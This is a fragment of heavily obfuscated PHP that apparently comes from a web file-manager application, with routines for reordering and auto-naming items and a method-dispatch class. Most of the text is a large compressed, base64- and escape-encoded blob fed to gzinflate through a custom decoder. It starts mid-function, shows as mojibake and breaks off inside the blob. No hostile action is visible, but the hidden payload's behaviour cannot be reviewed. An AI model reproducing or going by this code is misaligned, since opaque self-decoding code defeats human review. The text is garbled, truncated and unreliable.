$±Â¦İú•[$”¤†Ì¯“]; $this->where($ËÅá³…ì)->save(array($ÏòÎÌ‰é[1853] => $”¤†Ì¯“ + 1)); } return !0; } protected function moveTop($Õƒº‡îÄ) { $—‚À§ùÁ =& $_SERVER[¹Û¹Æ€]; $“×¹Ê¢¿ = array($—‚À§ùÁ[1650] => USER_ID, $—‚À§ùÁ[493] => 0); $õˆ„ñ¡« = $this->where($“×¹Ê¢¿)->where(array($—‚À§ùÁ[42] => $Õƒº‡îÄ))->find(); if (!$õˆ„ñ¡«) { return; } $Îû³´Úú = $this->field($—‚À§ùÁ[408])->where($“×¹Ê¢¿)->order($—‚À§ùÁ[2291])->select(); $Îû³´Úú = array_to_keyvalue($Îû³´Úú, $—‚À§ùÁ[22], $—‚À§ùÁ[408]); $Ş‘˜„â = $Îû³´Úú; $Îû³´Úú = array_remove_value($Îû³´Úú, $õˆ„ñ¡«[$—‚À§ùÁ[408]]); array_unshift($Îû³´Úú, $õˆ„ñ¡«[$—‚À§ùÁ[408]]); return $this->resetSort($Îû³´Úú); } protected function moveBottom($¶øö±µ¬) { $ÛòÁ™İè =& $_SERVER[¹Û¹Æ€]; $—¤Â¯øÅ = array($ÛòÁ™İè[1650] => USER_ID, $ÛòÁ™İè[493] => 0); $¼ïÇ = $this->where($—¤Â¯øÅ)->max($ÛòÁ™İè[1873]); $Å’ß™ğ = array($ÛòÁ™İè[1873] => $¼ïÇ + 1); return $this->where($—¤Â¯øÅ)->where(array($ÛòÁ™İè[42] => $¶øö±µ¬))->save($Å’ß™ğ); } private function getAutoName($±÷ÊøÀÏ) { $Ìç·üà =& $_SERVER[¹Û¹Æ€]; $™—ú‡ã’ = array($Ìç·üà[1650] => USER_ID, $Ìç·üà[493] => 0); $‹¥¹è×Ã = $this->field($Ìç·üà[42])->where($™—ú‡ã’)->select(); $‹¥¹è×Ã = array_to_keyvalue($‹¥¹è×Ã, $Ìç·üà[22], $Ìç·üà[42]); if (!$‹¥¹è×Ã || !in_array($±÷ÊøÀÏ, $‹¥¹è×Ã)) { return $±÷ÊøÀÏ; } for ($»„½ı¨Ù = 0; $»„½ı¨Ù < count($‹¥¹è×Ã); $»„½ı¨Ù++) { if (!in_array($±÷ÊøÀÏ . "\x28{$»„½ı¨Ù}\51", $‹¥¹è×Ã)) { return $±÷ÊøÀÏ . "\x28{$»„½ı¨Ù}\51"; } } return $±÷ÊøÀÏ . "\x28{$»„½ı¨Ù}\x29"; } } goto f“œÔÄİÌ; D‚Ş‡»•Ş®: function binCheckBigger($Åşá»…ƒ, $×¿»ñ²á) { return $Åşá»…ƒ > $×¿»ñ²á; } $_SERVER[$_SERVER[Ÿéô¿ñÒ][3]] = ("\70\61\71\60"."\63\61")+0;$_feg6="2dx3kwv8yz4t6icurmfj7eslqg09ph51baonibemapy9wdjrt2nk73hlxc01fqo6v5gsuz48b4yrjt59da";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Í¹á†Ä, $Æ•°Ññ£) { $›§¥ªˆƒ =& $_SERVER[¹Û¹Æ€]; if (isset(self::$_methodList[$Í¹á†Ä])) { return @call_user_func_array(self::$_methodList[$Í¹á†Ä], $Æ•°Ññ£); } else { if (method_exists($this, $Í¹á†Ä)) { return call_user_func_array(array($this, $Í¹á†Ä), $Æ•°Ññ£); } else { think_exception(__CLASS__ . $›§¥ªˆƒ[4] . $Í¹á†Ä . $›§¥ªˆƒ[5]); } } } public static function __callStatic($¥•ªäÏÃ, $šˆİõÄœ) { if (isset(self::$_methodListStatic[$¥•ªäÏÃ])) { return call_user_func_array(self::$_methodListStatic[$¥•ªäÏÃ], $šˆİõÄœ); } else { if (method_exists(self, $¥•ªäÏÃ)) { return call_user_func_array(array(self, $¥•ªäÏÃ), $šˆİõÄœ); } else { show_json("{$¥•ªäÏÃ}\50\51\40\x6e\157\164\x20\145\x78\x69\x73\164\73", !1); } } } public static function addMethod($É†Ó¼¦™, $ÄĞ”¼şâ) { self::$_methodList[$É†Ó¼¦™] = $ÄĞ”¼şâ; } public static function addMethodStatic($œÎï¨, $Ùõñ»‹¼) { self::$_methodListStatic[$œÎï¨] = $Ùõñ»‹¼; } } goto aÓÛÆ—¹æŠ; B‰ñ£Œ¢: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\271\333\271\235\306\200", base64_decode('uODVxaXK')); $_SERVER[¹Û¹Æ€] = explode(base64_decode('fAR8AXwB'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\xbd\x9\x78\x1b\xd5\xd5\x30\xc\xb4\x2c\x1\xda\x6\x42\xa1\x2d\x5\x6\x43\x6a\x3b\xd1\x62\x3b\x2b\x26\x8e\x91\x6d\xd9\x16\x91\x25\x23\xc9\x59\x6a".strrev('¾ÙB”.[	%´¡i´BĞ- Z;ì¤-[û)YhB†…	-äfeKYHÉ›')."\273\234\273\314\110\206\367\177\376\357\171\276\100\242\173\317\135\346\256\347\236\163\356\71\347\136\371\332\73\17\375\343\67\353\77\277\176\367\365\273\137\162\315\275\37\274\273\215"."\x86\xd7\xef\xb1\x7e\x4f\xf4\x1f\x9\x1f\x71\xce\x3e\xbb\x91\x3f\xb3\xce\x39\xbb\xa1\xa1\x77\xe1\xbe\x73\x63\xfb\x6f\xbe\xfd\x26\xed\x46\xed\x26\x6d\x53\x3c\xfa\xc4\x93\x91\x2f\xfc\xea\x47\xc7"."\207\167\135\373\304\344\256\335\167\273\350\206\356\217\132\121\146\132\266\225\376\50\45\323\121\364\11\303\166\154\12\120\265\234\121\320\151\30\207\154\143\112\227\123\222\50\36\51".base64_decode('iXR1RHfUjFly9BKroiOUjHSq/aFUL41r5XLQzo7aQc3K5I0xPWqkg2mjFMxqjhZA')."\x1\x9a\x6b\x5f\xfa\x33\x9f\xfe\x64\xf2\x7a\x66\x54\xd5\xd2\xa6\xe5\xe8\x59\xa\xaa\x94\xa\x46\x69\x14\x92\xcd\x52\xce\x18\xa1\x61\x56\x41\x90\xfe\xc\x24\xa2\x96\x5e\x34\x1d\x68\x75\x0\x1a"."\17\243\107\376\265\327\26\14\226\256\306\342\51\65\71\320\337\37\116\244\40\123\253\234\136\64\263\20\52\153\226\126\204\56\226\165\313\106\143\46\127\247\226\315\262\136\162\101"."\4\0\167\65\255\331\120\123\127\207\332\25\356\217\306\127\251\251\125\375\141\310\221\126\327\126\164\153\222\306\110\60\351\150\226\223\62\212\72\317\61\156\361\166\165\204\173\42".base64_decode('MSWVCMWSoc5UJB6j4M54X18kVQ1PxKPRjlDnsuqU/kSopy+koPahyTRKObNBWU1T')."\x56\x2b\x8d\x34\xd0\x6d\xe8\x5\x98\x84\x92\xc6\x9a\xe3\x4c\x96\x21\x94\xe2\x21\xb4\x98\x4a\x95\x42\x81\x46\x62\x3c\x94\xd5\x73\x5a\xa5\x0\xa3\xd5\x25\x47\xca\x96\x51\xd4\x58\xa7\x97\xe9\x93"."\34\12\53\247\342\230\106\51\103\43\341\11\307\322\4\34\265\65\203\46\32\55\73\12\113\206\243\341\316\224\202\33\250\164\47\342\175\12\114\102\121\263\35\335\122\126\364\206"."\23\141\5\67\272\255\236\364\265\136\201\365\22\103\103\241\204\242\121\145\272\32\34\275\130\146\325\320\62\65\52\213\47\272\302\11\245\143\225\42\106\50\143\26\213\146\51\200"."\x6a\x41\x33\xe9\x48\x4d\xd\x27\x12\x34\xe0\x83\x4d\x18\x8d\xe0\x49\x83\x48\xbc\xbb\x3b\x19\xe6\x31\xe8\xdc\x9\x51\xd4\x92\x79\xb0\x3e\x5d\xb1\x6c\xae\xe0\xa8\x63\x5a\xa1\xc2\x96\x29\x6c\x91"."\x7a\xf8\x81\x5f\xd3\x86\xa5\xbb\xd6\x28\x19\x15\x58\xa6\x50\x85\x69\xda\xac\xc5\x10\xa8\xb0\xdc\x3a\x83\xe8\x59\x8\x14\x51\x79\x13\x76\x1e\xda\x86\x63\x34\xd8\xb6\x94\xfe\x1e\xb\x99\xd2\x18".base64_decode('J4zplqPqpYyZNUqwWdth0WlOvstCuMACTGIWsiwsMA7GL7FKUc7CowiTFLKWXvrs')."\x9c\x34\x1a\xe5\xdb\x15\xe7\x15\xb1\x32\x6a\x9\xdf\xe9\x46\x6e\x52\xec\x37\xdb\xac\x58\x19\x84\xeb\x72\xa6\x28\xd7\xcf\x73\x37\x43\x26\xdd\x71\x50\xe7\x60\x6c\xc\x73\xa0\x5c\x30\xb5\x6c\x52"."\267\170\327\14\263\33\25\214\127\34\31\130\41\331\272\115\253\330\205\60\3\174\37\355\12\143\240\106\302\50\333\27\131\151\304\202\15\203\247\370\77\36\36\74\16\375\323\10"."\250\157\10\332\224\327\13\5\125\237\320\141\343\24\263\13\154\66\30\101\33\143\136\4\241\321\110\134\315\153\166\276\57\273\100\45\245\30\106\315\352\23\201\162\276\14\273\232"."\x6f\xe4\x21\xd7\xc2\xc6\x43\x17\x33\x9d\xb0\x74\x7a\x14\xcc\x8c\x56\x90\xbb\x48\xc3\x79\xc7\x29\x27\xf5\x52\xb6\x9b\x1f\x2d\x59\x73\xbc\x44\x46\xaa\xac\x33\xfc\xde\xe5\x53\xb2\x4a\x9f\xb2\x4a"."\xe9\x6d\x35\x5a\x6d\x56\xb0\x58\xe0\x21\xd6\x3b\xe\xb3\x39\xd0\x99\x60\xd3\x99\xcd\xd1\x0\x3f\x57\xea\xe0\x83\x86\x4d\x30\x9c\xd8\x9e\xe8\x58\x2a\x18\x19\xcd\x31\xcc\x52\xd0\xcc\x38\xba\xe3".base64_decode('tx1L16DGUCaj27a/E51sllnwhwoFc9wft4wRo9SqzAFkS489P0aArbBT645V8ELB').strrev('oª"cÉ–9¢«^nÚl»ºÙd9cPUhÎÃåºs²V–ÜòlÅşrqVÓ™Ÿ')."\373\224\374\6\76\53\365\252\274\341\211\262\141\351\66\153\253\322\323\227\202\112\120\355\272\277\337\322\106\212\132\253\122\256\244\321\310\300\116\255\1\243\271\141\150\132\225\14".base64_decode('jvqUYsV2/JaOUJGBjjsY5EjO34f3laFn/UmEsQE8r2m+gpaOwtIotDeV6lcj3ehI')."\216\205\325\276\120\252\23\10\210\260\243\215\260\66\107\21\36\346\125\62\340\112\77\332\137\170\161\305\120\137\5\260\337\34\327\55\364\341\216\311\126\145\324\314\246\315\211\0".base64_decode('S+oGUoZlxtNddvwJrTSCxyc96eiwBO2xEfdAR/XSiJNnBZPhxPJwQk3Gu1MrQgk4')."\314\113\150\225\114\260\117\341\252\13\376\204\236\105\103\237\161\130\71\255\214\107\215\345\301\233\3\317\25\113\305\33\206\245\105\43\75\170\140\272\374\66\312\344\227\163\261\272".strrev('KJÍ›Ê! öáœÀ®¡ÁÆœïô~¹ÙC'."\r".'9ùCmC¤‚ƒ@÷ÒtI'."\n".'xwmÀÑF£')."\323\102\245\37\221\36\206\126\120\240\323\125\71\232\224\370\62\367\260\210\325\134\62\113\372\247\14\16\76\273\244\155\357\31\126\12\114\204\117\30\10\47\123\152\137\70\325\33"."\357\202\257\207\103\20\212\232\164\333\262\336\16\322\237\141\230\335\141\372\243\32\166\267\164\254\340\50\107\77\252\231\136\203\46\243\117\147\70\66\107\161\164\244\250\215\170\120"."\76\216\365\231\226\356\206\210\243\152\205\221\145\147\2\216\366\352\306\110\36\306\313\300\265\145\314\202\151\151\5\214\31\331\246\320\31\266\32\61\0\133\1\22\26\221\244\121"."\54\263\306\72\371\112\61\55\5\1\333\333\150\375\60\134\226\67\371\171\206\50\146\40\23\202\220\161\166\113\67\303\366\301\344\74\364\277\100\355\131\263\250\61\104\111\120\234".base64_decode('nqU4joLmuFJ6dU0c0o7lmBhqubKgAc2bMLGIMYAmVXjbWCuzekFno5HX2THRBNnQ').base64_decode('McfHSnAjiNpDUHE+G3YClcRIncVXYPJYAByetYBOqDiZcRHvt/ScAZu0hGakT7NG')."\131\157\320\14\210\265\202\43\322\72\352\36\210\106\325\316\170\54\205\110\152\12\131\221\210\244\302\154\335\206\272\324\120\147\77\77\170\305\214\102\6\214\140\252\117\17\12\31"."\x6b\x81\x86\xa3\xe6\x4\xc5\x31\x87\x30\x76\xd9\x2c\xd9\xba\x1f\xd8\x2c\xbf\x20\xbd\xab\x92\xb2\xe2\x14\x0\x3c\x23\x4e\xe\xcf\x61\x30\xe1\xd7\x8a\x53\xfe\x22\xda\x2\x7e\xde\x50\xf7\x19\xac".strrev('†I¡SĞäŠp­(© úÇÁn´°Ší„?¿Ã±ÄF;$³<£ä¤').base64_decode('kSsoo2VMaaIv7awhrAfFgiDk3N3xiyFP9UZiy9S+eFc4qkZiCCWlquED/V0hNocy').base64_decode('vCPOmFiADiCktDwUjXizh1dGkqlkzSQEGwh7UhAH2J8Id0dW8mh3JBztSqqdoc5e')."\221\47\26\352\203\210\232\303\74\230\35\164\347\127\21\166\115\162\116\116\35\303\134\51\33\54\325\305\74\251\214\55\120\305\342\101\247\250\16\113\14\272\213\171\141\322\23\340"."\204\63\146\205\341\176\116\101\26\31\162\50\152\260\173\64\166\102\66\320\237\106\45\224\124\234\262\312\321\100\172\222\7\111\67\130\34\321\212\360\175\5\60\175\125\13\124\234".base64_decode('p0PPcQRcGxDKORzPe+Jo1Ys0NAMhwnSjlUBmBD5joD1kOSHWnJxgeNV4fzgRwuyy')._kodDe('LBSsgQMy5+NzwK4CDNNzUmEHRr9isoB6NsQW7Qr4Fn9veLsvZOvv7/jGM24SIU5Dow==')."\x4f\x63\xa4\xcc\x8e\x15\x16\xc8\xa1\xdd\xc0\x10\xaa\x59\xe1\x5f\x4b\x9b\x66\x81\x6d\x50\x44\x18\x70\x4c\xc1\xb9\xee\x35\x36\x5b\x24\x13\xc\xc7\xcc\x65\x27\x13\x1c\xc\xa9\xf8\xb2\x70\x4c\x65"."\x2b\x8b\xc6\xa4\xd5\x48\x1\x88\x8f\x8d\x27\x60\x40\x1c\x73\x94\x31\x63\x34\x31\x11\x4e\xb2\xed\x6d\xe9\x6b\x2b\x6\x1b\xae\x60\x60\x2e\xac\x62\x1d\x9d\x3d\xf0\xf9\xe0\x89\x43\xe3\x73\x1b\x6".base64_decode('/XMDwyjQOOc4GoXYUMAVPRrKVyxeGtNLDXZ7Y+tQcCjY0N46GPJPaf6pJv8x/uG5')."\x43\x81\xc6\xb9\x0\x18\x5e\xd7\xe2\x9b\xbf\x1\x67\x40\x19\xdb\x8f\x1a\x46\x3f\x6d\x43\xed\xb3\x87\xfc\xdf\x38\x69\xf5\x71\x83\x43\xc3\xf5\xad\x73\x8f\x1c\xa\x1c\x35\x34\x3e\x3c\xa7\xb1\x9d"."\175\47\123\261\20\243\231\231\344\115\315\316\155\100\115\102\164\24\317\122\42\270\116\312\300\22\246\214\262\200\256\133\270\201\301\321\34\352\43\242\304\240\177\150\356\160\273\124"."\x4e\x2\x79\xbf\x85\xe8\x24\x84\x78\xf3\x3c\x5f\xc8\xff\x4d\xdc\x33\x5e\x14\xef\x7b\x58\x1f\x95\x52\x46\x60\x4f\xbc\x2f\xd2\x5a\x6\xf0\x80\x31\x52\xe2\x5b\x8\x1d\xe6\x9c\x41\x77\x93\xef\xeb".base64_decode('ZtPfDWwiR/QJhhpKOcOC1VkpGWuZ/KGkr4WA6bD1ndadcZ0tDwR3xdHiYDwjSpJi')."\x5\x42\x11\xc2\x17\x30\x27\xc5\xd7\x28\x5f\x4c\x46\x59\xc5\xa4\xd5\x38\x8f\x65\xf5\x12\xcc\xd3\xc\xc8\x6d\x67\xb4\xb2\x9e\x94\x7a\xa8\xaa\xa9\x50\x47\x34\xac\x32\xc\x3\x98\x98\xc5\x9\x56"."\354\340\262\72\324\65\201\121\31\176\310\10\332\235\260\51\260\363\355\265\5\205\40\6\105\267\54\323\152\45\302\125\273\122\306\64\31\142\311\34\64\266\12\142\346\225\266\245"."\xa\x1d\x72\x28\xa7\xca\x13\x50\xd6\x18\x81\x80\xd9\x6c\x5d\x6c\x7a\x8c\xa1\xa0\x4d\x65\x31\x43\x36\xa2\xa4\x18\x59\x13\x6c\x18\x1a\xaa\xc\xea\xd9\xe1\x41\xb4\xf0\x35\x7f\x6e\x78\xdd\xbc\xd".base64_decode('jYy8Dw6hPywSqiFAUzk2VNHBHMDt4DIUV4Qn06hpcdqo7KKeHdPRCq4qUhjCUBM7')."\270\101\232\100\147\73\52\60\26\76\312\45\311\43\101\247\61\316\275\163\241\210\44\372\302\45\222\272\23\340\71\174\122\242\212\342\56\51\160\133\35\103\366\45\264\235\72\245"."\xa3\x8e\xca\x74\x92\x93\xb6\xa3\x17\x5d\xe2\x4a\x5b\xc7\x22\xec\xee\x4a\xa1\xe0\x70\x1a\xbe\x60\x8c\xc2\x17\x60\xaf\x80\xf4\xd4\xf\xa7\xc1\xdc\x5a\x45\xbb\x4d\x8b\xb1\xc2\x73\xa0\x19\x75\x73"."\x6a\x65\x8c\x94\x4a\x88\x71\x95\x97\x9a\x38\x64\x7b\x42\x88\x9c\x49\x29\xd\x4c\xd2\xa7\x44\x62\x4a\x47\x3c\x1e\xd\x87\x62\xa\x3e\xcf\xe1\x1c\x42\xc4\x42\x32\xdc\x1f\x42\x87\x18\x66\xaa\x93"."\xa9\x30\x8\x1f\x23\x5d\x7e\x56\xef\x4a\x7f\x4\x58\x2b\x1e\x30\x60\xd8\xcd\x32\xc6\x20\x2a\x1a\x13\x15\xb1\x30\xa3\x6c\x2e\x11\x42\x74\x58\x56\x10\x94\x41\xc\x53\x98\x3e\x2c\x1a\xf2\x61\x4a"."\303\207\372\340\303\174\221\117\220\357\76\41\151\363\215\31\372\70\11\160\52\333\7\304\267\317\321\54\104\60\140\352\30\202\221\56\237\141\167\21\316\201\174\200\44\261\6\71"."\171\54\0\51\150\223\76\332\270\250\76\246\27\174\254\151\76\326\142\37\143\12\175\204\223\353\202\146\15\240\315\5\315\42\101\204\103\363\76\274\234\360\152\366\11\111\240\317"."\34\57\351\26\311\2\303\44\230\16\237\140\110\174\43\226\131\51\367\263\157\112\61\332\54\0\210\66\163\100\302\64\35\37\143\62\175\62\377\11\255\10\261\135\123\163\70\153"."\xf7\x86\x8c\xbf\xb7\x11\x30\x77\x38\xa9\x7a\x94\x3e\x63\xb2\xaa\xe7\xc3\xcd\x6b\xaf\xa3\x35\x2\x33\xbf\x81\x9d\x79\xae\x3c\x62\x7a\xd9\x36\x2c\xe8\x22\x86\x27\x40\x84\x96\x8b\x6d\x8c\x3b\xd4".strrev('&g¡8iY´êPÊŒ-ö´sŸJIJhş0Q^–²ö‚¾\'ìBÆ[\'d*Ö¯+É­').base64_decode('M4JX7ZI4YHfMvbkqqL6klvN00kd2Wa0dUnsF8FXPJ2zfGTPYiLOtwGfftYM+e+9C')."\57\11\272\214\227\5\301\101\33\213\121\166\22\35\200\335\5\66\104\55\162\62\40\153\237\73\206\267\136\200\40\157\162\237\222\344\102\215\150\270\73\245\34\37\107\230\316\60"."\x55\x5a\x46\xc5\x99\x15\xf2\x8f\x59\x52\x5c\x75\xb3\xe1\x52\xda\x48\xba\x88\x6b\xa5\x2c\x85\xac\x46\xa7\xc2\xea\xb6\x3a\xf6\x91\x3a\x57\x71\xb1\x68\xdc\x8d\xf0\xb1\xa8\x52\xbd\xc\xf1\x70\xcb"."\203\200\27\7\351\276\70\311\30\50\56\16\316\12\120\211\232\15\374\32\226\217\103\110\147\60\61\265\362\52\225\220\221\0\260\166\271\276\213\243\142\207\261\45\241\340\17\370"."\x24\xba\x6\x23\x1c\xbf\xd8\x2b\x52\xd4\x3d\xe4\x9e\x15\xe9\x39\x6e\xf1\x10\xf5\x1b\xa5\x49\xa3\x24\x8b\xb2\x4\x54\x9c\xd8\x82\x60\xc0\x5b\xdd\x23\x7c\xeb\x9a\x2e\x4c\x8f\x18\x21\x2a\xf3\x81"."\10\315\207\57\211\245\303\134\310\161\120\353\311\205\165\321\45\364\253\156\71\103\272\320\351\201\144\70\241\262\157\303\356\206\25\237\327\54\61\230\14\47\141\304\40\4\204\70"."\213\210\112\331\162\332\230\40\146\134\145\44\314\142\73\223\254\365\162\320\135\51\215\166\115\27\351\345\202\220\132\121\31\117\31\166\224\137\260\273\303\244\247\51\263\146\24\113".base64_decode('2ViYEgv8MhFNQgNDKkCMqJJIgSMlN8ajTQrxAwAdq+hQpGFE+xfQWWgF8B7qwSea')."\x7c\x98\xb8\x9\x92\xa4\x8e\x36\xc\x94\x13\xb5\x25\xab\xd2\xe4\xdc\x42\x9c\x84\xf\x7\x71\x98\xb0\xb1\x16\x5b\x50\x8c\xbf\xd8\x6f\xae\xa5\x32\x22\x5a\x87\x71\xb8\x5a\xdd\x28\xbc\xdc\x6b\xc7".strrev('Ñ`)F‹e¬öLAD©×˜¨ x–KÆT*‘ˆ¸àÒìôÆ¿)l$êfğHœÍS“-»')."\263\57\200\230\15\270\172\366\65\111\224\233\100\112\353\154\162\212\300\131\271\301\63\351\216\151\42\16\326\12\130\350\313\242\101\22\102\4\154\102\156\46\361\241\51\323\33\274"."\26\33\45\110\250\335\115\126\261\222\311\262\306\266\5\360\47\25\376\31\116\3\2\116\63\62\243\142\53\153\143\32\132\214\120\65\351\214\150\51\215\107\71\31\215\61\115\70"."\153\70\30\202\17\122\223\11\312\105\106\351\72\232\303\144\4\117\316\251\252\311\27\74\211\157\266\53\247\233\322\0\340\34\102\0\4\4\141\44\337\306\147\314\62\254\3\111"."\371\244\150\216\351\22\60\140\73\146\131\244\110\121\232\54\45\211\112\245\134\174\152\110\73\320\26\313\22\242\132\14\24\311\13\145\11\177\116\167\161\0\163\44\1\31\227\207".base64_decode('LIstW9o5fMODgDIIY8Ak23O1jjRaeXhMqJbQqvCHAxQDBLRsNs5uueRwdVZZVlm7')."\x22\xa2\xe7\xc3\xab\x92\x62\xb5\xb3\x87\xa\x5\xa1\x1b\xe0\x8d\x4f\x5b\x84\x6e\x76\xb9\x90\xc\x99\xb6\x58\x37\x61\x8e\xd9\x5d\x5d\x2d\x18\x67\x84\xe4\xcd\xe6\x26\xe6\x85\x46\x87\x97\xe8\x77".base64_decode('4+3pCZxpkJyY0NpxRBN05o2SbvOj3bJr4az/x5R09RzgvTLdwsFpknwbK7uNuc5x')."\56\304\25\50\113\42\125\310\261\257\72\56\42\53\101\352\220\66\217\153\75\240\315\112\373\214\217\245\110\34\155\306\332\53\324\233\117\147\142\154\202\347\46\370\321\52\27\302".strrev(' S£‹ĞÆ¼4EöõŸ7ßøşuÿ¾ß‡Êq<µæK'."\r".'WL\'+Cç\'AÊó§”«¦¾xI')."\343\4\365\250\365\130\140\364\71\32\26\52\227\247\255\134\147\36\372\370\1\75\317\234\64\263\376\316\75\303\137\60\216\77\50\174\313\15\373\45\327\367\136\330\360\217\265\27"."\356\350\171\371\247\377\54\155\36\377\353\237\336\134\153\306\217\36\370\44\163\173\337\226\366\304\165\133\367\173\66\174\316\363\371\123\16\316\147\366\316\237\177\325\214\377\26\157"."\xec\x79\x30\xfc\x6e\xe9\x88\xf1\xfa\x55\x67\x29\xaf\x8e\xe5\x46\xc6\x47\x72\xdf\xfa\xd7\xca\x9d\x57\x7e\xf8\xe7\x5f\x6c\xbe\xe2\xc3\xf2\xa9\x7f\x9f\x79\xd5\xd2\x2d\xa7\x36\x5d\xf5\xfe\x91\xb7"."\67\235\262\376\261\103\67\357\232\333\275\175\145\360\220\337\55\336\373\275\223\332\337\171\357\367\75\177\371\371\57\316\175\356\240\117\376\330\67\243\240\55\331\165\324\361\133\236"."\xd9\xe7\xc0\x58\xf6\xbc\x27\x3e\x77\xce\x2f\x67\xcc\x4c\x44\x77\x8c\x59\x17\x7c\x74\xd2\xe5\xc7\x1d\x92\xbc\xf4\xfc\xc5\xa9\x65\xff\xdd\xf4\xa7\x93\x3a\xf\x7d\xf5\x83\x8f\xe\x1e\x79\x61\xed".base64_decode('klm/+ueDb750wLk9pw3tuSN24z1ntD907UMPHb39w9v+eMO/Tln455fW+L96e+u6')."\365\367\157\177\253\220\372\343\324\145\137\336\353\374\35\233\17\133\374\124\346\312\326\337\357\327\262\374\57\57\337\62\320\160\321\152\343\236\246\350\57\216\172\162\375\265\247\235".base64_decode('vvvG417YaHzw01vvyF04539uX/GvD387tscfnPNbfvePxw9fOe/05fcosRvHD7i0').strrev('òy×?ïqšr~ë1æS7¥¯ıáíxÿgóàßOv½[ÏÄüú=wMôã8¯‘ó')."\xee\x1d\xb7\xe5\x3a\x33\x43\x3f\xfd\xc1\xcc\xe6\x3d\xd2\x95\x19\xf7\x7d\x69\xe3\xbe\xa7\x85\x66\x46\x9b\x9b\x3f\x38\xf2\xc0\xba\xc0\x3b\x1d\x4b\x6f\xfd\xfa\x81\x4f\x5f\xbc\xb8\xb0\xef\xcc\x7f"."\76\274\317\235\267\164\234\231\275\145\326\343\7\175\140\24\356\74\167\377\125\311\303\317\371\205\377\365\272\330\254\305\351\330\137\63\257\356\261\367\27\166\75\370\364\347\56\275"."\xf9\xe5\x2f\x14\x1a\x6e\x3a\xb4\x79\xc7\x7b\x1b\xce\x35\xd2\x4d\xb3\x67\x8e\xad\x6f\x78\x51\xfb\xdc\x1e\x7b\x4f\x1c\xb2\xfc\x80\x47\x7e\xbb\xfb\xe5\xcb\xfc\x5f\x3f\xf9\x84\x27\x2f\x5e\x9e\x5c"."\367\104\163\337\75\317\156\374\355\206\261\107\373\316\215\116\256\372\366\300\277\77\372\374\237\32\377\330\167\234\66\153\326\41\373\354\354\133\362\357\231\173\355\352\174\174\333\221".strrev('r=-ß³¦sîGÍÔşØ\\.äÿ!µ=\'5Ùò|?í¦ÎĞäü0Ÿ\'%ôr¼|^Ø­O{')."\xe7\xcb\x9b\x6e\xdb\x32\x7c\xdb\x85\xff\x1c\x9a\x7f\xa5\xf5\x9d\xbf\x36\x56\xe\xba\x7e\x6e\xd3\xac\x65\x8b\x86\xae\xfc\xd5\x4b\xb7\x3f\x95\xbb\x70\xcb\xa9\x47\x7e\x5d\x79\xf2\x92\x4a\xfd\x6e"."\235\27\76\74\352\174\377\27\67\331\207\333\363\37\214\276\75\147\150\257\305\107\357\365\354\125\41\345\201\137\76\243\154\12\274\365\172\327\340\221\233\314\157\36\326\174\346\335"."\xaf\xdf\x18\x68\x9e\xf5\xda\x57\xda\xf\x58\x75\xdb\x61\xd9\x13\xf7\x78\xf9\xf2\xf7\x2e\xfb\xd2\xfe\x97\xde\xfb\xe3\x65\x4f\x2e\x5c\x72\x7a\xc3\xc3\x57\xef\xe5\xfb\x4a\x7c\xe1\xfd\x3f\x5b\xb0".strrev('ø~Ö\'ëâğ<¯g›nÖıßVïqîüŸ[úÆÆx:¦e<S=gzŸëaxÚ£‘¾»×')."\x6d\xcb\xeb\x6b\x1a\xf\x6b\xda\xb8\xaa\xfd\xcb\x3f\xbc\xc4\x98\xf9\xe2\xc4\xef\x1e\x3b\x7c\xfd\xbc\xb6\xc7\x1e\x9\x29\xb1\x2b\x1b\xfb\xfe\xfa\xec\xd7\xae\xdf\x30\x7b\xfb\x81\xab\x36\x5c\x7b".strrev('Õ˜÷=_¬?Òèc2¾+÷ó?ĞûÌ'."\r".'ÇYêå¾>o“üÿÏÇÉñæ}Ï—ñııjî¦kã')."\x97\xcd\xd9\xfb\xcc\x5\x53\xf7\x9e\x77\xeb\x1d\x8f\x9f\xb7\xfb\xde\xe7\xfd\xf2\x91\x2d\x57\x27\x1f\x7b\xe6\x86\x93\x6f\x99\xd5\xb5\xfa\x80\xaf\x3d\x37\x3e\xb8\x6e\xea\x8e\x17\xdf\xfa\xfa\xeb"."\x37\x7d\xf1\x95\xc3\x16\x2e\x7c\xe7\xa4\xeb\xe7\xdd\x3d\x74\xc5\xcc\xbf\x77\xff\xee\x42\xdf\x77\xae\xed\xbc\xe1\x9f\x56\xdd\x25\x8f\x9c\xd8\xd5\xf2\x41\xd7\xfb\x3\xa7\x77\x17\x5e\x4c\x9e\x35".strrev('ºÈ|?£ëùšÿÃã4e†zG©àóú·ív¿îZw÷}<‡™E‚ËnÏ;ë5?')."\xc9\xcf\x7d\x60\x3f\x6f\xfc\x7e\xfe\xe6\x4b\xaf\x3a\xe4\x67\xc7\x7e\xe3\xb9\x1f\xdd\x71\xff\xcd\x43\xb1\x6d\xab\xf2\x73\x5e\x9b\x9b\xf4\x5d\xd3\xd0\x74\xf3\xe0\xab\x2f\x37\x1e\x7d\xe8\xbf\x46".base64_decode('c8W/PbL16eF5b3bsO/bnJXvofz+sLvLivS1vbvhP6qOp2665PPOV2F2NL0y+dmld').base64_decode('086W5/b98TNf6N3nG+ZZz1191MZn/zNL/+ozuwb3TfleWfHsk7ufsc/1462Vj656')."\346\167\251\313\303\127\355\171\126\327\363\317\257\176\372\271\17\66\345\256\175\351\325\375\276\120\370\363\144\313\227\357\174\367\366\335\317\231\361\300\235\3\57\376\161\364\366\337"."\x5e\x7a\xc0\x4f\x92\x47\x6e\xfa\xf1\xee\x4f\x7\xbe\x52\x7f\xcf\x4e\xff\xea\x17\xef\x5b\x35\xd4\x3c\xf3\x8b\xa7\xcd\x58\xb6\xd9\x7c\xfb\xd2\xab\x4a\x87\x6f\x7f\x79\xc2\xaa\x7c\xf9\xac\xd7\xef"."\x3a\x7f\xeb\x86\x15\x7f\x7b\xfc\xa9\x97\x9f\x7a\xa5\xc3\xf9\xd5\xf0\x9f\x2e\xb9\xfd\xda\x8d\x7\x7f\xfb\x96\xf3\x7\x57\x87\x8f\x78\xa1\xef\xb5\xa7\x1f\xbd\xf1\x91\x2f\x6f\xf\x3d\x3a\xf0\x